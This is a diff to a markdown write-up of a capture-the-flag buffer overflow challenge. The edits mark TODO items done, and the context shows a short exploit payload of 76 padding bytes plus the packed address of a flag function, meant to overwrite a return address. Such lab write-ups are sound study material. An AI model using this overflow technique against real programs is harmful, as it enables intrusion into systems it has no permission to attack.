@@ -5,9 +5,9 @@ You beat the first overflow challenge. Now overflow the buffer and change the re
 ## TODO
 
 - [x] Create python script to complete challenge
-- [ ] What is the exploitable piece of code?  
-- [ ] How are we going to exploit it?
-- [ ] The exploit
+- [x] What is the exploitable piece of code?  
+- [x] How are we going to exploit it?
+- [x] The exploit
 - [ ] Is there any similar challenges I can link to?
 
 ### Exploitable piece of code
@@ -41,4 +41,4 @@ payload = "A"*76
 flag_address = elf.symbols['flag']
 payload += p32(flag_address)
 ```
-Now we need to send the payload and we will have the flag. 
+Now we need to send the payload and we will have the flag.
